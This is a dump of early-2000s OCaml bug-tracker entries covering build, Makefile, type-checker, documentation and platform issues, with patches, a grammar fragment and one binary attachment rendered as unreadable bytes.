unit) -> unit\n  end\n  module Parser (Params:PARSER_PARAMS) : PARSER_TYPE = struct\n\n%}\n\n%token <int> Line\n%token <string> Base Dollar Code\n\n\n%nonassoc shift\n%right Dollar Base\n%left Line Code\n\n%start prog\n\n%type <(string -> unit) -> unit > prog\n\n%%\n\nprog:\n| xcaml prog  {fun out -> $1 out; $2 out }\n| text  prog  {fun out -> $1 out; $2 out }\n| {fun out -> ()}\n;\n\nxcaml:\n| xcaml_elem %prec shift {fun out -> out $1}\n| xcaml_elem xcaml       {fun out -> out $1; $2 out}\n;\n\nxcaml_elem:\n| Line {sprintf \"\\n# %d \\\"%s\\\"\\n\" $1 Params.filename }\n| Code {$1}\n;\n\ntext:\n| simple_text %prec shift {fun out -> out open_write ; $1 out; out close_write}\n| dollar_text             {fun out -> out open_printf; $1 out}\n;\n\nsimple_text:\n| simple_text simple_elem  {fun out -> $1 out; out $2}\n| simple_elem              {fun out -> out $1}\n;\n\nsimple_elem:\n| Base {$1}\n;\n\ndollar_text:\n| simple_text dollar_elems\n    {fun out -> $1 out; out close_printf; $2 out}\n;\n\ndollar_elems:\n| dollar_elem dollar_elems {fun out -> out $1; $2 out }\n| dollar_elem {fun out -> out $1}\n\ndollar_elem:\n| Dollar  {$1}\n;\n\n%%\n\nend\n\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1885\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Vladimir TÃ¡mara\nVersion: 3.07\nOS: OpenBSD\nSubmission from: gateway1-theorie.informatik.uni-kl.de (131.246.16.250)\n\n\nAfter compiling doing:\n$ cd camlp4/lib\n$ sudo make installopt\nproduces\n-------\ncp gramlib.cmxa *.cmx \"/usr/local/lib/ocaml/camlp4/.\"\ntar cf - gramlib.$(A) | (cd \"/usr/local/lib/ocaml/camlp4/.\"; tar xf -)\n/bin/sh: A: not found\ntar: Unable to access gramlib.: No such file or directory\ntar: End of archive volume 1 reached\ntar: Sorry, unable to determine archive format.\ntar: WARNING! These file names were not selected:\ngramlib.\n-------\n\nVariable substitution $(var:old_string=new_string) in the standard make of\nOpenBSD \ndoesn't allow variables in [new_string].  Patch (just tested in OpenBSD 3.3)\n\n--- Makefile    Fri Aug 29 14:15:15 2003\n+++ Makefile.patched    Mon Oct 20 13:42:46 2003\n@@ -43,6 +43,6 @@\n \n installopt:\n        cp $(TARGET:.cma=.cmxa) *.cmx \"$(LIBDIR)/camlp4/.\"\n-       tar cf - $(TARGET:.cma=.$(A)) | (cd \"$(LIBDIR)/camlp4/.\"; tar xf -)\n+       n=`echo \"$(TARGET)\" | sed -e \"s/.cma/.$(A)/g\"`;tar cf - $$n | (cd\n\"$(LIBDIR)/camlp4/.\"; tar xf -)\n \n include .depend\n"},{"labels":["bug"],"text":"**Original bug ID:** 1884\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Sejourne Kevin\nVersion: 3.06 & 3.07\nOS: (win  3.07)(debian 3.06)\nSubmission from: aste-genev-bois-104-1-1-143.w217-128.abo.wanadoo.fr (217.128.225.143)\n\n\nPour reproduire ce message d'erreur etrange il faut saisir c'est ligne dans un\ninterpreteur interractif.\n\n# let f = function `A _ -> 1 | `B x -> x;;\nval f : [< `A of 'a | `B of int ] -> int = <fun>\n# let g = function `C _ -> 2 | `B x ->if x then 3 else 4;;\nval g : [< `B of bool | `C of 'a ] -> int = <fun>\n\n# let h x = (f x)+(g x);;\nCharacters 19-20:\n  let h x = (f x)+(g x);;\n                           ^\nThis expression has type [< `B of int & bool ] but is here used with type\n  [< `B of bool & int ]\n\n\nEvidemment ce code ne devrais pas compiler, mais l'explication donnÃ© par\nle compilateur est trÃ¨s curieuse.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1883\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nDeux utilisateurs m'ont signalÃ© un problÃ¨me avec mon package ulex:\n\n  http://www.cduce.org/download/ulex-0.3.tar.gz\n\net OCaml 3.06. Il semble qu'ocamlc et ocamlopt produisent des .cmi\nincompatibles pour les mÃªmes sources.\n\nclipper ~/ulex-0.3 $ make all\nocamlc -a -o ulexing.cma utf8.mli utf8.ml ulexing.mli ulexing.ml\nocamlc -a -o pa_ulex.cma -pp 'camlp4o pa_extend.cmo q_MLast.cmo' -I +camlp4 cset.ml ulex.mli ulex.ml pa_ulex.ml\nclipper ~/ulex-0.3 $ make all.opt\nocamlopt -a -o ulexing.cmxa utf8.mli utf8.ml ulexing.mli ulexing.ml\nclipper ~/ulex-0.3 $ make run_test\nocamlc -o test -pp 'camlp4o ./pa_ulex.cma' ulexing.cma test.ml\nFiles test.cmo and ulexing.cma(Ulexing)\nmake inconsistent assumptions over interface Ulexing\nmake: *** [run_test] Error 2\n\n\nLe problÃ¨me semble avoir disparu avec OCaml 3.07. Est-ce qu'un bug qui \npourrait expliquer Ã§a a Ã©tÃ© corrigÃ© depuis OCaml 3.06?\n\nLe Makefile gÃ©nÃ¨re directement les .cma et .cmxa depuis les sources, avec\nun seul appel aux compilateurs. Je pense que Ã§a ne devrait pas poser de \nproblÃ¨me.\n\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1882\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Dustin Sallings\nVersion: ocaml 3.06\nOS: MacOS X/Linux/NetBSD\nSubmission from: sjc-dist3-e3.2wire.com (63.203.253.2)\n\n\nUnix.mktime is documented as taking a tm struct.  However, this tm struct uses a\nbool for tm_isdst.  mktime itself will accept three values for this field (1, 0,\nor -1 for yes, no, and figure-it-out).  I believe this functionality is\nimportant because I typically don't know whether dst is in effect when parsing a\ndate, so I rely on mktime to just do the right thing.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1881\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n1) camlp4/etc/Makefile\n\nThe makefile for camlp4 syntax extensions does not automatically compile \nand install pa_ocamllex. The modified makefile I attached works for me: \npa_ocamllex.cma is correctly built and installed in the appropriate \ndirectory.\n\n2) Documentation for the pervasives module \n(http://caml.inria.fr/ocaml/htmlman/manual033.html)\n\n > type ('a, 'b, 'c, 'd) format\n\nThis conficts with\n\n > type ('a, 'b, 'c) format = ('a, 'b, 'c, 'c) format4\n\nmentioned at http://caml.inria.fr/ocaml/htmlman/libref/Pervasives.html\n\n\nAlex\n\n----------------\n# $Id: Makefile,v 1.15 2003/08/29 12:15:15 xleroy Exp $\n\ninclude ../config/Makefile\n\nINCLUDES=-I ../camlp4 -I ../boot -I $(OTOP)/lex\nOCAMLCFLAGS=-warn-error A $(INCLUDES)\nOBJS=q_phony.cmo pa_o.cmo pa_op.cmo pa_oop.cmo pa_ru.cmo pa_format.cmo pa_olabl.cmo pa_sml.cmo pa_lisp.cmo pa_scheme.cmo pa_extfold.cmo pa_extfun.cmo pa_fstream.cmo pa_lefteval.cmo pa_ifdef.cmo pr_r.cmo pr_rp.cmo pr_o.cmo pr_op.cmo pr_scheme.cmo pr_schemep.cmo pr_extend.cmo pr_extfun.cmo pr_null.cmo pr_depend.cmo\nOBJSX=$(OBJS:.cmo=.cmx)\nINTF=pa_o.cmi\nCAMLP4_LIBS=pa_ocamllex.cma\nCAMLP4_LIBSX=pa_ocamllex.cmxa\nCAMLP4OM=pa_o.cmo pa_op.cmo ../meta/pr_dump.cmo\n#CAMLP4OMX=pa_o.cmx pa_op.cmx ../meta/pr_dump.cmx\nCAMLP4OMX=$(CAMLP4OM:.cmo=.cmx)\nCAMLP4SCHM=pa_scheme.cmo ../meta/pr_dump.cmo\nSHELL=/bin/sh\nCOUT=$(OBJS) camlp4o$(EXE) camlp4sch$(EXE)\nCOPT=$(OBJSX) camlp4o.opt\n\nall: $(COUT) $(CAMLP4_LIBS) mkcamlp4.sh\nopt: $(COPT) $(CAMLP4_LIBSX)\n\npr_rp.cmo: parserify.cmo pr_rp_main.cmo\n\t$(OCAMLC) parserify.cmo pr_rp_main.cmo -a -o $@\n\npr_op.cmo: parserify.cmo pr_op_main.cmo\n\t$(OCAMLC) parserify.cmo pr_op_main.cmo -a -o $@\n\npr_schemep.cmo: parserify.cmo pr_schp_main.cmo\n\t$(OCAMLC) parserify.cmo pr_schp_main.cmo -a -o $@\n\npr_schemep.cmx: parserify.cmx pr_schp_main.cmx\n\t$(OCAMLOPT) parserify.cmx pr_schp_main.cmx -a -o $@\n\ncamlp4o$(EXE): ../camlp4/camlp4$(EXE) $(CAMLP4OM)\n\trm -f camlp4o$(EXE)\n\tcd ../camlp4; $(MAKE) CAMLP4=../etc/camlp4o$(EXE) CAMLP4M=\"-I ../etc $(CAMLP4OM)\"\n\ncamlp4sch$(EXE): ../camlp4/camlp4$(EXE) $(CAMLP4SCHM)\n\trm -f camlp4sch$(EXE)\n\tcd ../camlp4; $(MAKE) CAMLP4=../etc/camlp4sch$(EXE) CAMLP4M=\"-I ../etc $(CAMLP4SCHM)\"\n\ncamlp4o.opt: $(CAMLP4OMX)\n\trm -f camlp4o.opt\n\tcd ../camlp4; $(MAKE) optp4 CAMLP4OPT=../etc/camlp4o.opt CAMLP4M=\"-I ../etc $(CAMLP4OMX)\"\n\nmkcamlp4.sh: mkcamlp4.sh.tpl\n\tsed -e \"s!LIBDIR!$(LIBDIR)!g\" mkcamlp4.sh.tpl > mkcamlp4.sh\n\npa_ocamllex.cma: pa_ocamllex.cmo\n\t$(OCAMLC) -I $(OTOP)/lex cset.cmo syntax.cmo table.cmo lexgen.cmo compact.cmo pa_ocamllex.cmo -a -o pa_ocamllex.cma\npa_ocamllex.cmxa: pa_ocamllex.cmx\n\t$(OCAMLOPT) -I $(OTOP)/lex cset.cmx syntax.cmx table.cmx lexgen.cmx compact.cmx pa_ocamllex.cmx -a -o pa_ocamllex.cmxa\n\n\nbootstrap_scheme:\n\t@$(MAKE) bootstrap_l L=scheme | grep -v directory\ncompare_scheme:\n\t@$(MAKE) compare_l L=scheme | grep -v directory\nbootstrap_lisp:\n\t@$(MAKE) bootstrap_l L=lisp | grep -v directory\ncompare_lisp:\n\t@$(MAKE) compare_l L=lisp | grep -v directory\n\nbootstrap_l:\n\t../boot/camlp4 ./pa_$Lr.cmo ./q_phony.cmo -I ../boot pa_extend.cmo ./pr_r.cmo ./pr_extend.cmo ./pr_rp.cmo pa_$L.ml > tmp\n\tmv pa_$Lr.ml pa_$Lr.ml.old\n\tsed -e 's/^;; \\(.*\\)$$/(* \\1 *)/' -e 's/^; \\(.*\\)$$/(* \\1 *)/' -e 's|./pa_$Lr.cmo|pa_r.cmo pa_rp.cmo|' -e 's/$$Id.*\\$$/File generated by pretty print; do not edit!/' tmp > pa_$Lr.ml\n\trm -f tmp\n\ncompare_l:\n\t../boot/camlp4 ./pa_$Lr.cmo ./q_phony.cmo -I ../boot pa_extend.cmo ./pr_r.cmo ./pr_extend.cmo ./pr_rp.cmo pa_$L.ml | sed -e 's/^;; \\(.*\\)$$/(* \\1 *)/' -e 's/^; \\(.*\\)$$/(* \\1 *)/' -e 's|./pa_$Lr.cmo|pa_r.cmo pa_rp.cmo|' -e 's/$$Id.*\\$$/File generated by pretty print; do not edit!/' | diff -c pa_$Lr.ml -\n\nclean::\n\trm -f *.cm* *.pp[io] *.o *.bak .*.bak *.out *.opt\n\trm -f mkcamlp4.sh camlp4o$(EXE) camlp4sch$(EXE)\n\ndepend:\n\tcp .depend .depend.bak\n\t> .depend\n\t@for i in *.mli *.ml; do \\\n\t  ../tools/apply.sh pr_depend.cmo -- $(INCLUDES) $$i | \\\n\t  sed -e 's| \\.\\./\\.\\.| $$(OTOP)|g' >> .depend; \\\n\tdone\n\nget_promote:\n\ninstall:\n\t-$(MKDIR) \"$(LIBDIR)/camlp4\" \"$(BINDIR)\"\n\tcp $(OBJS) \"$(LIBDIR)/camlp4/.\"\n\tcp $(CAMLP4_LIBS) \"$(LIBDIR)/camlp4/.\"\n\tcp $(INTF) \"$(LIBDIR)/camlp4/.\"\n\tcp lib.sml \"$(LIBDIR)/camlp4/.\"\n\tcp camlp4o$(EXE) camlp4sch$(EXE) \"$(BINDIR)/.\"\n\tif test -f camlp4o.opt; then cp camlp4o.opt \"$(BINDIR)/camlp4o.opt$(EXE)\"; cp -f $(OBJSX) $(OBJSX:.cmx=.o) \"$(LIBDIR)/camlp4/.\"; cp $(CAMLP4_LIBSX) \"$(LIBDIR)/camlp4/.\"; fi\n\tcp mkcamlp4.sh \"$(BINDIR)/mkcamlp4\"\n\tchmod a+x \"$(BINDIR)/mkcamlp4\"\n\npa_lisp.cmo: pa_lispr.cmo\npa_scheme.cmo: pa_schemer.cmo\npa_ocamllex.cmo: pa_o.cmo\npr_extend.cmo: pa_extfun.cmo\npr_o.cmo: pa_extfun.cmo\npr_op.cmo: pa_extfun.cmo\npr_r.cmo: pa_extfun.cmo\npr_rp.cmo: pa_extfun.cmo\n\ninclude .depend\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1880\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Mikhail Zabelin\nVersion: OCaml 3.07 native Win32 port (MinGW)\nOS: Windows 2000\nSubmission from: www-proxy.ioffe.rssi.ru (194.85.224.35)\n\n\nsource file f.ml:\n------------------------------------\nmodule M =\n  struct\n    type x = {y: int}\n    let z =  {y = 1}\n  end\n\nlet a = M.z.M.y  (*unexpected too*)\nlet b = M.z.y\n------------------------------------\n\ncompile:\n------------------------------------\n>ocamlc f.ml\nFile \"f.ml\", line 8, characters 8-13:\nUnbound record field label y\n------------------------------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1878\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFrom: Remi Vanicat <vanicat@labri.u-bordeaux.fr>\n\n> this one is unsafe : the fact that a is a block with a tag\n> Obj.double_tag doesn't proof that the same is true for b even if a and\n> b have the same type :\n> \n> # let i1 = Lazy.lazy_from_val 0.0;;\n> val i1 : float Lazy.t = lazy 0.\n> # let o1 = Obj.repr i1;;\n> val o1 : Obj.t = <abstr>\n> # Obj.is_block o1;;\n> - : bool = true\n> # Obj.tag o1 = Obj.double_tag;;\n> - : bool = true\n> # let i2 = lazy 3;;\n> val i2 : int lazy_t = <lazy>\n> # let o2 = Obj.repr i2;;\n> val o2 : Obj.t = <abstr>\n> # Obj.is_block o2;;\n> - : bool = true\n> #  Obj.tag o2 = Obj.double_tag;;\n> - : bool = false\n> \n> both i1 and i2 have the same type, but only the first one is a block of\n> tag Obj.double_tag. A verification have to be done for both argument.\n\nVery interesting: you have found an unsoundness in the ocaml compiler.\nUsing your example combined with arrays we obtain:\n\n# let arr = [|Lazy.lazy_from_val 0.0; lazy 1.0|];;\nval arr : float Lazy.t array = [|lazy 0.; lazy 4.32681603021051e-311|]\n\ni.e., the second lazy is assumed to be a float value, and results in a\nwrong result (clearly 1.0 is not anything close to 4.32e-311)\n\nSo my take on this is that the code suggested for min is correct, this\nis the compiler which is wrong: two values with the same type _must_\nhave the same representation.\n\nA new headache for implementers...\n\n   Jacques Garrigue\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1877\n**Reporter:** administrator\n**Status:** resolved (set by @xavierleroy on 2012-08-02T07:37:59Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jun Furuse\r\nVersion: 3.07\r\nOS: msvc\r\nSubmission from: lamarck.inria.fr (128.93.1.21)\r\n\r\n\r\nHi,\r\n\r\nI found a difficulty of compilation with msvc, in the case that \r\na responsefile is required: i.e. the case the command line goes longer\r\nthan 256 chars. At this moment, for example, \r\nthe option -cclib \"/link /libpath:blahblah\" is stored\r\nwrongly inside responsefile in two lines as follows:\r\n\r\n  \"/link\"\r\n  \"/libpath:blahblah\"\r\n\r\nand the /libpath option is ignored by the compiler:\r\n\r\n  Command line warning D4002 : ignoring unknown option '/libpath:blahblah'\r\n\r\nThe option /link /libpath:blahblah must be stored in one line like:\r\n\r\n  \"/link /libpath:blahblah\"\r\n\r\nFor a quick workaround, I use -cclib \"/link/libpath:blahblah\" \r\nat this moment...\r\n\r\n--\r\nJun\n"},{"labels":["bug"],"text":"**Original bug ID:** 1876\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Remi Vanicat\nVersion: 3.07\nOS: all\nSubmission from: ca-bordeaux-4-179.w80-8.abo.wanadoo.fr (80.8.76.179)\n\n\nHello,\n\nI've just remark that the documentation of the format type in the htmlman is\nincorrect:\nin http://caml.inria.fr/ocaml/htmlman/manual033.html\n\nthere is documetaion for type ('a, 'b, 'c, 'd) format when it is format4 that\nhave the 4 argument. format have only 3.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1873\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Samuel Mimram\nVersion: 3.07\nOS: Linux\nSubmission from: babasse.residence.ens-lyon.fr (140.77.128.253)\n\n\nHello,\n\nI didn't manage to understand why the following program:\n\nexception Toto\nCallback.register_exception \"toto\" Toto\n\nraises the following error when compiled with ocamlc:\n\nFile \"toto.ml\", line 2, characters 0-8:\nSyntax error\n\nwhereas the folling one compiles perfectly well:\n\nexception Toto;;\nCallback.register_exception \"toto\" Toto\n\nThank you,\n\nSamuel.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1872\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Eric Cooper\nVersion: 3.07\nOS: i686 GNU/Linux\nSubmission from: 12-203-149-172.client.attbi.com (12.203.149.172)\n\n\nThe emacs function caml-types-explore, bound to the middle mouse button, works\nfine while the mouse button is held down, but produces an error when the mouse\nbutton is released:\n   Invalid function: #<subr track-mouse>\n\nThe problem is the (unwind-protect (caml-track-mouse ...) ...) form.  It works\nOK if you replace caml-track-mouse by track-mouse.  I assume the defalias\ndoesn't work because track-mouse is itself a special form.\n\nA couple of related problems with this function:\n\nThe very first time I click on an expression, it displays *no type information*.\n Subsequent clicks work fine.\n\nIf there are no .annot files, I get a \"wrong type argument: number-or-marker-p\"\nerror.  This one is annoying, because it also pastes the X cut buffer at that\npoint, modifying the file in a random way.\n\nMinor problems aside, this is a great feature -- thanks a lot.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1871\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello, I just got around to testing 3.07 on Panther (I'm in the seed \nprogram), and I ran into a compile error.\nIt's a really simple thing, which I'm including a patch to fix.\n\nThe problem is this,\nin $camldist/otherlibs/threads/scheduler.c at type called thread_t is \ndefined. However,\nthat type is also defined as part of the interface to the mach \nsubsystem in the kernel, mach_types.h,\nwhich is included by malloc.h. So if you want to allocate any memory, \nyou're pretty much screwed wrt\nthread_t. My patch renames thread_t to cthread_t, which resolves the \nissue. Thanks for all your hard work\non objective caml!\n\n\n----------------\nBZh91AY&SYÂ±Â¬ÃÃ¿\u0000\u0006âÃâ¬}:yÃ¿Ã¿Ã»??ÃÂ Â¿Ã¿ÃÃº`\u0007ÃÃ°(\u0000\u0000\u0000\u0000\u0000\u0002?Ã&â¬Ã\u001a4a\u001a\fFËâ¢14\u0018F??\fË\u001cÃh\r\u0001Â£F\u0011Â Ãiâ°â\u0013Aâh\u0019\u0000Ã?Ã&â¬Ã\u001a4a\u001a\fFËâ¢14\u0018F??\fË\tSÃµ*OP\u001a\u0003ÃÃµ\u0000\u0003AÂ \u0000\u0000\u0000b\u0003&â¬s\tÂ 4\u0006?\u0018FÆ\u0011Â¦&LM\u0006\u0011Â d\u0003&\u0001TB\u0002hÃ4\u0004h4L\u0013!4Ã4\u00014ÃÃIÃ©ÂµLjQ:ÂªÂªÂªÂªÂ­2@KÂ°Ã\fâÃ¤\b$\u0013\u0010,âÂ¸Â¢Ë\\QD%%UQDÂ®KÃÂ¢ÃâQÃÃdÂ°IdâÂ¢Ã333\u001eEÃÃ±3\u0012â¢ËÂªÃ·\bâ xVÃ³)Å½ÂºÃÂ¬Ã\u0017]M\"\u0017Â¡\u0010Å½D\u0012Ë\"Q\u0011\u001cÃÃPÅ (Ã¯*U&+\u0011D=Â·ÃQ\u0013\t!Ã¹\u0014GÂµÃº\u001dÃ\u0019D?U\f^?Â¾zOÅ¾ÂµÃ´VÃÃ¶n{[Å¾ÃÂ¥\u0014^ÃÃs>ÃÃÃÃuÂ­uÂ¬Ã±Ã¢r\u001f\u0001â¡YÂ¶\u0014Ã¡VÂ±=Ã®lÃRËUU[ÃÅ \fâ¬1H\u0010ÅâÃDÂ¨â¹\u0017ÂºRÃ¦I*\"ËÃ¬Â¢1Ã¢\\Â©râ°=*Â½);dÂ¬Â¢Ã¤Â¿Â¶Å 9ÅÃUÃ¯ZÂ¯\u001f\bgÃÃ\u0018/K\u0004Å¡Â³9Å .dÃ Â£&ÅUU{\u0005â¢â¢rmÃÃ»Ã¢lK6ÃÂ±Â°Â³czÂ¯!â¹kÃÃ¢GuâdÂ²JÅ½'câ¢Â±UÃ%&?UTÃ\u0012UTqÃ©\u000e;?Ã\u0016DÂ±hÃbQ(y\u0004Iâ¢Ã´\u0014\u0017ÂºÅ \u0015<Å½\u0005Ã¦Ã¤\\âOÃ1zUbÃ¢0q\u001câ¦Ã¦ÃÃª#\u0004Ã¥1âÃº-Å?\u001e$Ã§3Ã©PÃÃ\u0011ÃyÃÂ¢*Â²Â­V^Ã¬t\u001câ¹âº\u001fSâ°C\u0005Ãâ¢Â¾\u0006â¢â¢ÃÂ¾ËÃâÃÃD;Â©ËJ!ÃIâ\u0011ÃE\"\u0013\u0010âDn9\u001b\u001eÃ³\u0014ÂµqÂ·Â®}ÃÂ¹-Ã¯3Ã,â)Ã£ËjâD7âHâ Â¦ÃÃIDÂ¥\u001bÃ[Ã¢ofwÅ\u000e\u0002/>âÃÅ >âÆÃªâ¢Â±gÂ¥Â¦IÃ§\u001a9Ã¹&yzÅâ¹â:\u0017/|\u0019>Ã£\u001a2Q\u001f+ÃÂ¢RâÂ¥â¹Ã¯Å¡Â¥ÃQ\u001b\u00173Â¹Uâl??Å Å½Ã©Ã²6Â±bÃVyÃ¦ÃÃquMÃ³3c\u0016,wLÃ¨YdÂ¥)[tÃ\u0016Ã?â ÃÃJS\u0015Ã©y\u001dÃ£,Ã³x\u000fÂ©ÃÃ«UCÃâQÃÂ³Â¥Ã¨XÂ¹Tââ?Ã¥PÂ´Â¦ÃRm5MfÂ³ÂµÂ¼??\u001fÃ Â¢\"â°BRâ¡m\u0011\u001bQÅ¡Â®Ã±Ã~(Ã¯,Ã¸Ã®}Â¯QfÂ¨fÂ¢ËândâÃÃ¿?RT~Ã[F?â¹ÃËÃ¬hÃÂ¢=EFËÃ?^Â¤P\bÃ½ÃJ/ËÂª4EÃª,â¹\"Ã³Ã¾Â¢Å¾ÃÂ¡eÃª\u001eÃÂ¾Â³ÃÅ¡0r\"W Â·Ã°Ã­?WJ>ÃÃ¤Ã·â\u001e\u0014<GÃ I)GY(\u001f`Ã¼\u0011+$â¹âyqÂ¸Â£Ã´w\u0015F(ËGÃ¤~oAÃ½\u0011Ã\u0017Â·$Â©\nÂ¤Â¨ÂªNÂ½â¦\u001bYÂ¨Â¨Â¢BÂ®Â¹z?Ã¤Ã»Ã¢fb8Ã½G\u0012NÂ§Ãnz\u0016mÂªÂ®CÃjÃÃ§IcÃÂ©\u0017,â¹Â¢&Ã±C\u0005IQ%\u0005PÂ´Å½ÃÅ %ÂªËJQ\n%\u0011RTtÂ¨?DÂ¥Ãâ¹ÃÂ Ã´(\\Ã½Â²UÃ²Ã¤\\K$7;M\u0011FÃ¶Â¯Â¥ÃÂ½BÂ¢Ã\u0015T,Å½t\u0011\u0016QÃ½x\u0014s6\u001dÃµÃ¨hx\u001a%\u001dÃ[?2ÃµPÃâ%Ã®\u001dÃ¶NâÃ£\u0003'Â±Ãâ¢Å¡Ã\u000e&Nt?Ã\u0011ÃÃÃ®â¹Å½â¢YÂ¸0Å Â£Â¥xÃTÂ±ÃÂ¼â{Ãª\u0011Ã¢U\u001aâ\u0011bDDÃ°(6Å¾\u0004d?Ã¯^Ã©Å¾$}\tqÃ¤ÃÃ â¡xÃÃ¯â¢Â£ÃÃ¥FÂ¦Ã¶ÅZÂ¡Â¢9ÃÃÃ¶(Â½ÃÂ¹&Ã\u0006?G\u0003â¢\u00192`ÃÃ¥(Â©Â¡$Â¥Ã(Q\u0005]*Â¼Ã¯\n*Âªâ Ã³Â©{\u0007PâÂ¤Ã¸X#qT#%Ã\u001bcâ¢Â¢Ã²ÃµZ\u0018(Â²Â«%WA+â¹âÂ¥Ã²\u0015FÃ\u0007\u0013âÂ©KÂ Ã³\u0014/#â¢Å¡(ÃÂªÃÂ¨XâÂ¡#ÃIÂ½Ã\\JÂ£Â¬Ã·\u001aÂ±>$Â¨â .Ã9âdy\u001b\\Â§a(Ã°\u001aÂºâ8*Ã¬mqÂµ,Â£âYÅ½Â²â¦Ã¨â ÃËEÃ©>Â·\u0012Ã¢ÃÃ¨IÃ¢vâ\\xYÅ¡?\u001cÃÂ¤*DU-W%ÃFK6Â®Pâ°q.\u0018,â\u0010Ã¯\u0012ÃÃfÅ½s3\u0006â¹Ã<*\"LLNÂ´n`Â«â(p\fT`PÃÂ¹Ã3t#O<Ã\f\u001bâ=ÃâBÂ«Ë1EPÃÅ T*^^â(Â¹FÃ¢Ã¢Kâ\u00140DE[â°u=ÂºÂ¥)ÃÂ±Ã¹Â¬oYDÅ¸â¹Â¶Â¡R7âÃJIDJ$â¢Râ¦\u0011\"\u0012ÃU\u0011UÂ¤ÂªÂ¢*ÃÂ¨\u000bÃ°0DÂ¸\u0002\u000b7\u001aâÂ¹Å¡8Ã!#Â´ÃÃÂ¸Ã¤#Â¾âtÂ¡Å¡Â­Ã¨ÃÃ6ÂµB2Tâ¦ÃÅM\u001câÂ¨J$Ã^ÃÂ²ÃÃbYÂ¢Ã²â¹Ë$â¦Y7Â¨Â¢ÃÃ¢\u0019Â¸;\nÂ¿Ã¸Â»â)Ãââ¦?fÂ§Ã¸----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1870\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Remi Vanicat\nVersion: 3.07\nOS: \nSubmission from: ca-bordeaux-11-197.w80-8.abo.wanadoo.fr (80.8.83.197)\n\n\nHello,\n\nI would like first to say that the http://caml.inria.fr/camlp4/ page contain two\ndead link : the  Compressed tar archives of HTML files of the manual and of the\ntutorial.\n\nBy the way, I'm the debian maintener of the ocaml-doc package, and I'm waiting\non the camlp4 documentation to make a new package, but If i don't upload it\nbefore the end of the week, the package might not enter the futur debian. Will\nyou have finished the new camlp4 doc then ?\n"},{"labels":["bug"],"text":"**Original bug ID:** 1869\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Josef Svenningsson\nVersion: 3.07\nOS: Solaris 7\nSubmission from: muppet90.cs.chalmers.se (129.16.228.10)\n\n\nI am trying to install ocaml-3.07 on a sparc machine running solaris 7.\nEverything works fine until I do make opt.opt. During making the following error\nhappens:\n\n[snip]\nmake[2]: Entering directory\n`/.../chalmers.se/fs/cab/cs/work/proj/multi/home/src/ocaml/ocaml-3.07/camlp4/odyl'\ncp odyl_config.ml odyl_config.ppo\n../../ocamlcompopt.sh -warn-error A -I ../../otherlibs/dynlink -c -impl\nodyl_config.ppo\nmake[2]: *** [odyl_config.cmx] Error 138\nmake[2]: Leaving directory\n`/.../chalmers.se/fs/cab/cs/work/proj/multi/home/src/ocaml/ocaml-3.07/camlp4/odyl'\nmake[1]: *** [opt.opt] Error 2\nmake[1]: Leaving directory\n`/.../chalmers.se/fs/cab/cs/work/proj/multi/home/src/ocaml/ocaml-3.07/camlp4'\nmake: *** [camlp4optopt] Error 2\n[end]\nI have applied the patch sent out to the mailing list a few days ago but that\ndoesn't help.\nSome info that might be relevant:\nuname -a:\nSunOS 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-80\n\ngcc -v:\ngcc version 2.95.3 20010315 (release)\nIf you need any more info just let me know.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1868\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** 